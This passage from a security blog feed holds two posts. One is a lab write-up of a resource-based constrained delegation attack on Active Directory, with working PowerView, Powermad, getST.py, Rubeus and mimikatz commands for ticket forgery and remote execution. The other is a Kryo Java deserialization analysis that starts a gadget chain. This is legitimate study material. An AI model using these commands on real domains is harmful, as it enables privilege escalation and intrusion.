    <content type="html"><![CDATA[<p><a href="https://blog.csdn.net/qq_44159028/article/details/124118253">参考文章1—CSDN</a></p><p><a href="https://xz.aliyun.com/t/7454">参考文章2—xz阿里云</a></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>打春秋云镜<code>Certify</code>遇到的这个知识点   在这里记录一下  简称<code>RBCD</code></p><p><strong>(约束委派和非约束委派再新开一篇文章来写)</strong></p><p>这里的话因为懒得搭建环境  就直接用别人的截图了</p><h2 id="RBCD"><a href="#RBCD" class="headerlink" title="RBCD"></a>RBCD</h2><p>基于资源的约束性委派：为了使⽤户/资源更加独⽴，微软在Windows Server 2012中引⼊了基于资源的约束性委派。<strong>基于资源的约束委派不需要域管理员权限去设置相关属性，⽽是将设置委派的权限交给了服务机器。服务机器在自己账户上配置<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>属性，就可以进行基于资源的约束委派。</strong></p><p>配置了基于资源的约束委派的账户的 <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> 属性的值为被允许基于资源约束性委派的账号的SID。<strong>如admin—pc的 msDS-AllowedToActOnBehalfOfOtherIdentity 属性的值为test的sid值(——这里就是说test这台计算机就对这个admin-pc这台计算机具有xxx权限   什么权限的话得看加域用户如何设置了——-)</strong>。2008 及以下的域控没有 msDS-AllowedToActOnBehalfOfOtherIdentity 这个属性，只有 Windows Server 2012 和 Windows Server 2012 R2 及以上的域控制器才有 msDS-AllowedToActOnBehalfOfOtherIdentity 这个属性</p><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p><strong>简单来说就是你获得的用户对该主机的属性具有写权限，那么这个用户就可以对该主机进行攻击</strong></p><p>(GenericAll  GenericWrite  WriteProperty  WriteDacl)  具体来看就是这个权限  使用<code>bloodhound</code>的时候有的话应该能看到</p><h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><ul><li><p>域：test.local</p></li><li><p>域控为：dm2012.test.local，Windows Server 2012R2</p></li><li><p>目标主机：dm2008.test.local，windows Server 2008R2</p></li><li><p>用户：qiyou，对dm2008.test.local主机具有写权限  </p><p><strong>(这个用户就是加域用户了)</strong>  <strong>在添加新的计算机到该域中的时候就需要该用户的身份验证</strong></p></li><li><p>其它域内主机：win10</p></li></ul><p>验证qiyou这个用户对dm2008是否具有写权限，可以使用<code>PowerView</code>枚举<code>DM2008.test.local</code>的中的特定ACE</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Import-Module PowerView.ps1   //这个脚本github上就能找到</span><br><span class="line">Get-DomainUser -Identity qiyou -Properties objectsid</span><br><span class="line">Get-DomainObjectAcl -Identity DM2008  | ?&#123;$_.SecurityIdentifier -match &quot;S-1-5-21-662417213-3583657854-423750704-1001&quot;&#125;</span><br><span class="line"></span><br><span class="line">//就是获取这个 加域用户的sid  如何去配置了资源委派的机器上查看msDS-AllowedToActOnBehalfOfOtherIdentity 这个参数上的值是否是该加域用户的sid 时的话就是该机器基于qiyou的资源委派</span><br></pre></td></tr></table></figure><p><strong>(这里的话用上面参考的CSDN文章给的AdFind.exe工具来判断也是可以的)</strong></p><p>可以看到qiyou这个用户对dm2008这个计算机账户拥有完全控制权限（GenericAll），其实也不一定需要<code>GenericAll</code>权限，<code>GenericWrite</code>、<code>WriteProperty</code>、<code>WriteDacl</code>等等权限都是可以修改账户属性的。</p><p><img src="../images/image-20230927164119419.png" alt="image-20230927164119419"></p><p>我在本地拿之前配置好的环境试了一下也是差不多的</p><p><img src="../images/image-20230927164221926.png" alt="image-20230927164221926"></p><p>我们现在还需要的是一个具有SPN的账户，因为<code>S4U2Self</code>只适用于具有SPN的账户，恰好的是在域中有一个属性<code>MachineAccountQuota</code>，这个值表示的是允许用户在域中创建的计算机帐户数，默认为10，这意味着我们如果拥有一个普通的域用户那么我们就可以利用这个用户最多可以创建十个新的计算机帐户，而计算机账户默认是注册<code>RestrictedKrbHost/domain</code>和<code>HOST/domain</code>这两个SPN的，所以这里刚好符合我们的意图。</p><p><strong>(这里不用本机用户的原因就是因为不知道本地管理员密码  所以就自己添加一个新的计算机到域里  并自己配置账号密码)</strong></p><p>我们可以使用<code>Kevin Robertson</code>的<code>Powermad</code>中的<code>New-MachineAccount</code>来创建一个用户名为<code>evilsystem</code>，密码为<code>evil</code>的计算机账户</p><p><a href="https://github.com/Kevin-Robertson/Powermad/blob/master/Powermad.ps1">Powermad.ps1</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">powershell</span><br><span class="line">Set-ExecutionPolicy Bypass -Scope Process</span><br><span class="line">import-module .\Powermad.ps1</span><br><span class="line">New-MachineAccount -MachineAccount evilsystem -Password $(ConvertTo-SecureString &quot;evil&quot; -AsPlainText -Force)</span><br><span class="line"></span><br><span class="line">//再次说一下  做这些的话都要基于在加域用户的基础上</span><br></pre></td></tr></table></figure><p>可以看到成功创建一个计算机用户<code>evilsystem</code></p><p><img src="../images/image-20230927165549634.png" alt="image-20230927165549634"></p><p>下面是修改DM2008的<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>属性的值，有两种方法可以修改，<code>Powerview</code>或者<code>ActiveDirectory</code>模块</p><p><strong>(就是修改该值为新加入的计算机的SID值)</strong></p><p>这里演示还是使用<code>PowerView.ps1</code> 这个工具</p><p>配置evilsystem到DM2008的基于资源约束的委派</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList &quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-662417213-3583657854-423750704-1115)&quot;</span><br><span class="line">$SDBytes = New-Object byte[] ($SD.BinaryLength)</span><br><span class="line">$SD.GetBinaryForm($SDBytes, 0)</span><br><span class="line">Get-DomainComputer DM2008| Set-DomainObject -Set @&#123;&#x27;msds-allowedtoactonbehalfofotheridentity&#x27;=$SDBytes&#125; -Verbose</span><br><span class="line"></span><br><span class="line">//sid值记得修改为新加入域的计算机的SID还是就是加入到哪台计算机也要写</span><br></pre></td></tr></table></figure><p>验证是否成功添加</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-DomainComputer DM2008 -Properties msds-allowedtoactonbehalfofotheridentity</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230927170320114.png" alt="image-20230927170320114"></p><p>若想清除msds-allowedtoactonbehalfofotheridentity属性的值，可用如下命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-DomainObject DM2008 -Clear &#x27;msds-allowedtoactonbehalfofotheridentity&#x27; -Verbose</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230927170421613.png" alt="image-20230927170421613"></p><h2 id="生成票据攻击"><a href="#生成票据攻击" class="headerlink" title="生成票据攻击"></a>生成票据攻击</h2><p>使⽤ impacket的 <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/getST.py">getST.py</a> ⽣成票据（建议使⽤ socks5），会在当前⽬录下⽣administrator.ccache ⽂件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python getST.py -dc-ip 192.168.10.2 test.lab/test\$:123456 -spn cifs/ADMIN--PC.test.lab -impersonate administrator</span><br></pre></td></tr></table></figure><p>这里解释一下这个cifs是个啥东西</p><p><img src="../images/image-20230927185849305.png" alt="image-20230927185849305"></p><p><img src="../images/image-20230927185911136.png" alt="image-20230927185911136"></p><p><img src="../images/864b8f14979f4217bf2d096044ea6c39-16958117211886.png" alt="img"></p><p>(这里用的时CSDN上的一张图  不过都差不多)</p><p>如何使用<code>mimikatz</code>注入内存就行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz &quot;kerberos::ptc administrator.ccache&quot;</span><br></pre></td></tr></table></figure><p>导入票据之后  可以使用psexec对计算机进行远程命令执行了</p><h2 id="解决敏感用户不可委派的问题"><a href="#解决敏感用户不可委派的问题" class="headerlink" title="解决敏感用户不可委派的问题"></a>解决敏感用户不可委派的问题</h2><p>在域环境中，高权限用户如果没有特殊需求的情况下，考虑到安全性一般是设置为不可委派，或者是加入受保护组</p><p>下面我们把administrator设置成不可委派以及加入受保护组，如图</p><p><img src="../images/image-20230927195016925.png" alt="image-20230927195016925"></p><p>可以看到administrator是不可委派并且是受保护组的成员</p><p><img src="../images/image-20230927195034613.png" alt="image-20230927195034613"></p><p>这时候我们在通过s4u去申请一下票据，这个时候<code>S4U2self</code>是成功的，但是<code>S4U2proxy</code>是失败的、</p><p><img src="../images/image-20230927195119851.png" alt="image-20230927195119851"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe s4u /user:dm2008$ /rc4:b5cffac3d2bb5d5a7ded8ff2a70c29dc /impersonateuser:administrator /msdsspn:cifs/dm2008 /ptt</span><br><span class="line"></span><br><span class="line">//这里获取的hash值是dm2008$这个机器的</span><br><span class="line">能psexec登录到dm2008的控制台后 我们就可以来获取hash值了</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230927195506176.png" alt="image-20230927195506176"></p><p>也就是说账户不可委派以及受保护组的成员是不影响S4U2Self的，可以使用<code>Rubeus describe</code>查看一下S4U2self返回的票据信息，<strong>可以看到该票据是没有服务名称的</strong>，并且不可转发(<strong>就是不可以执行ptt  不能注入到本地)</strong></p><p><strong>注：</strong> 如果该账户设置了<code>TrustedToAuthForDelegation</code>为True，则S4U2Self生成的票据是可转发的，默认为False</p><p><img src="../images/image-20230927195626598.png" alt="image-20230927195626598"></p><p>那么我们使用下面的这两个命令来添加SPN就行了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe tgssub /ticket:test.kirbi /altservice:cifs/dm2008 /ptt</span><br><span class="line">Rubeus.exe tgssub /ticket:test.kirbi /altservice:host/dm2008 /ptt</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://blog.csdn.net/qq_44159028/article/details/124118253&quot;&gt;参考文章1—CSDN&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://xz.aliyun.com/t/7454&quot;&gt;参考文章2—</summary>
      
    
    
    
    
    <category term="内网渗透" scheme="https://ke1nys.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>Java-Kryo反序列化</title>
    <link href="https://ke1nys.github.io/posts/f0050380.html"/>
    <id>https://ke1nys.github.io/posts/f0050380.html</id>
    <published>2023-09-19T11:48:38.000Z</published>
    <updated>2023-09-25T07:41:06.411Z</updated>
    
    <content type="html"><![CDATA[<p>在网上看文章得时候  无意中看到这个Kryo反序列化  于是就写这篇文章来学习一下</p><p><a href="https://kaikaix.github.io/2023/09/07/kryo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">参考文章1</a>    <a href="https://github.com/p4d0rn/Java_Zoo/blob/2766f312d34c1267fee76c6e1a749d657d412c69/Deserial/Kryo.md">参考文章2</a></p><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Kryo 是一个快速序列化/反序列化工具，其使用了字节码生成机制。Kryo 序列化出来的结果，是其自定义的、独有的一种格式，不再是 JSON 或者其他现有的通用格式；而且，其序列化出来的结果是二进制的（即 byte[]；而 JSON 本质上是字符串 String），<strong>序列化、反序列化时的速度也更快</strong> (<strong>一个优点</strong>)。</p><p><strong>其相对于其他反序列化类的特点是可以使用它来序列化或反序列化任何Java类型，而不需要实现Serializable。</strong>(这就是这个类得特殊之处了)</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>引入依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.esotericsoftware<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>kryo<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>先写个demo来进行分析</p><p><strong>MyClass.java</strong>  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyClass</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String hello;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> num;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;MyClass&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;hello=&#x27;&quot;</span> + hello + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, num=&quot;</span> + num +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getHello</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> hello;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setHello</span><span class="params">(String hello)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.hello = hello;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getNum</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> num;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setNum</span><span class="params">(<span class="type">int</span> num)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.num = num;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>demo.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.esotericsoftware.kryo.Kryo;</span><br><span class="line"><span class="keyword">import</span> com.esotericsoftware.kryo.io.Input;</span><br><span class="line"><span class="keyword">import</span> com.esotericsoftware.kryo.io.Output;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileNotFoundException;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">demo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> FileNotFoundException &#123;</span><br><span class="line">        <span class="type">Kryo</span> <span class="variable">kryo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Kryo</span>();</span><br><span class="line">        kryo.register(MyClass.class);</span><br><span class="line">        <span class="type">MyClass</span> <span class="variable">myClass</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyClass</span>();</span><br><span class="line">        myClass.setHello(<span class="string">&quot;nihao&quot;</span>);</span><br><span class="line">        myClass.setNum(<span class="number">123</span>);</span><br><span class="line">        <span class="type">Output</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Output</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;file.bin&quot;</span>));</span><br><span class="line">        kryo.writeClassAndObject(output, myClass);</span><br><span class="line">        output.close();</span><br><span class="line">        <span class="type">Input</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Input</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;file.bin&quot;</span>));</span><br><span class="line">        <span class="type">MyClass</span> <span class="variable">myClass1</span> <span class="operator">=</span> (MyClass)kryo.readClassAndObject(input);</span><br><span class="line">        input.close();</span><br><span class="line">        System.out.println(myClass1);</span><br><span class="line">        <span class="comment">//将一个类当作字符串进行输出 会触发该类里的toString()方法</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230924153830572.png" alt="image-20230924153830572"></p><p>成功进行序列化和反序列化操作  </p><p>这里进行选择的是<code>writeClassAndObject</code>和<code>readClassAndObject</code>  这两个类来进行序列化和反序列化</p><h3 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h3><p><img src="../images/image-20230924191631796.png" alt="image-20230924191631796"></p><p>下个断点进行分析</p><p><img src="../images/image-20230924191707982.png" alt="image-20230924191707982"></p><p>然后在这里的话会进行已经注册的类进行获取  </p><p> <img src="../images/image-20230924192116625.png" alt="image-20230924192116625"></p><p>然后到这里的话就会新型序列化类的获取  然后将其进行序列化操作</p><p><img src="../images/image-20230924192225130.png" alt=""></p><p>这里的话就会使用<strong>递归</strong>来将值一步一步的进行写入</p><h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><p><img src="../images/image-20230924192524040.png" alt="image-20230924192524040"></p><p>反序列化也是一样  也是会进行已经注册的类的获取</p><p><img src="../images/image-20230924192622533.png" alt="image-20230924192622533"></p><p>然后就是进行序列化类的获取  这里都是使用默认的 <code>FieldSerializer</code> </p><p><img src="../images/image-20230924192720179.png" alt="image-20230924192720179"></p><p>然后就是开始反序列化读取之前序列化的内容了 </p><p><strong>这里的写的比较简略</strong></p><p>(其实在这个序列化器里的wirte和read方法里面还有更加细致的分析是怎么进行<strong>写入和读取的 </strong>     因为比较懒  这里就不写了)</p><h3 id="简略分析"><a href="#简略分析" class="headerlink" title="简略分析"></a>简略分析</h3><ol><li><strong>经过上述的分析知道了是得先获取这个注册类这个东西  如果不进行注册的话就会进行报错</strong></li></ol><p><img src="../images/image-20230924193119546.png" alt="image-20230924193119546"></p><p>就是序列化和反序列化需要用到的类  如果不在默认注册表里就会报错</p><p><img src="../images/image-20230924193411188.png" alt="image-20230924193411188"></p><p><img src="../images/image-20230924193219192.png" alt="image-20230924193219192"></p><p>这里就是会爆出这个错误</p><ol><li>还有一个就是使用这个kryo进行序列化和反序列化操作的话  因为经过上面简单的分析  我们发现每次进行序列化或者反序列化的时候  都是会先用到<code>FieldSerializer</code>这个类  当我们跟进这个类的时候  就会发现这个类调用的是一个无参方法  </li></ol><p>​        <img src="../images/image-20230924193957490.png" alt="image-20230924193957490"></p><p><img src="../images/image-20230924194203562.png" alt="image-20230924194203562"></p><p>关于这个问题  翻阅文档发现  在这个地方如果执行下面这个代码的话  就不会进行构造函数的调用  就不会发生上面一样的问题</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kryo.setInstantiatorStrategy(<span class="keyword">new</span> <span class="title class_">DefaultInstantiatorStrategy</span>(<span class="keyword">new</span> <span class="title class_">StdInstantiatorStrategy</span>()));</span><br></pre></td></tr></table></figure><h2 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h2><p>这个<code>Kryo</code> 其实是和这个<code>Hessian</code>  差不多  问题都是出在这个<code>put</code>方法这里</p><p>经过上面的分析呢  我们知道是怎么个反序列化的过程  在使用<code>FieldSerializer</code>  进行反序列化<code>read</code>的时候呢  对于某些类的参数会采用不同的<code>Serializer</code>来进行反序列化读取</p><p>(如果我们传入的参数是<code>hashmap</code>类的话  那么在反序列化的时候就会使用<code>mapSerializer</code>进行反序列化  其中就会调用到<code>map.put()</code>这个函数  这就是我们的漏洞利用点了)</p><p>写个demo进行分析</p><p><strong>User.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">    <span class="type">Test</span> <span class="variable">test</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setHashMap</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.hashMap.put(test,<span class="string">&quot;test&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">getHashMap</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="built_in">this</span>.hashMap);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>demo.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.esotericsoftware.kryo.Kryo;</span><br><span class="line"><span class="keyword">import</span> com.esotericsoftware.kryo.io.Input;</span><br><span class="line"><span class="keyword">import</span> com.esotericsoftware.kryo.io.Output;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileNotFoundException;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">demo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> FileNotFoundException &#123;</span><br><span class="line">        <span class="type">Kryo</span> <span class="variable">kryo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Kryo</span>();</span><br><span class="line">        kryo.register(User.class);</span><br><span class="line">        kryo.register(HashMap.class);</span><br><span class="line">        kryo.register(Test.class);</span><br><span class="line">        <span class="type">User</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">        u.setHashMap();</span><br><span class="line">        <span class="type">Output</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Output</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;file.bin&quot;</span>));</span><br><span class="line">        kryo.writeClassAndObject(output, u);</span><br><span class="line">        output.close();</span><br><span class="line">        <span class="type">Input</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Input</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;file.bin&quot;</span>));</span><br><span class="line">        <span class="type">User</span> <span class="variable">o</span> <span class="operator">=</span> (User)kryo.readClassAndObject(input);</span><br><span class="line">        input.close();</span><br><span class="line">        o.getHashMap();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230924203625589.png" alt="image-20230924203625589"></p><p>先是进入到<code>FieldSerializer#read</code>  然后在进行filed的获取  然后根据<code>filed</code>是什么类 然后获取该类的反序列化类来进行反序列化输出结果</p><p><img src="../images/image-20230924203939849.png" alt="image-20230924203939849"></p><p>然后接着就会进入到反射参数类<code>ReflectField</code>的<code>read</code>方法里面</p><p><img src="../images/image-20230924204213255.png" alt="image-20230924204213255"></p><p>然后再次进行kryo的readobject中</p><p><img src="../images/image-20230924204244355.png" alt="image-20230924204244355"></p><p>这里的就会调用到这个<code>MapSerializer</code>来反序列化我们的<code>hashmap</code>参数了</p><p><img src="../images/image-20230924204325436.png" alt="image-20230924204325436"></p><p>在<code>MapSerializer</code>反序列化的过程中就会调用到这个<code>map.put()</code>方法了  因为我们的key可控  那么我们就可以将其视为反序列化的入口了</p><h2 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h2><h3 id="URLDNS"><a href="#URLDNS" class="headerlink" title="URLDNS"></a>URLDNS</h3><p>先去查看这个的原来的利用链</p><p><img src="../images/image-20230924204609239.png" alt="image-20230924204609239"></p><p>发现他是使用这个<code>HashMap.readobject()</code>来作为反序列化的入口  那么我们的这个Kryo刚好可以进行替代</p><p>(因为触发点都是这个<code>map.put()</code>  并且key可控)</p><p><img src="../images/image-20230924205134166.png" alt="image-20230924205134166"></p><p><img src="../images/image-20230924205434785.png" alt="image-20230924205434785"></p><p><code>put</code>的时候也能触发</p><p><strong>Test.java</strong>   —-&gt; <strong>利用链</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span 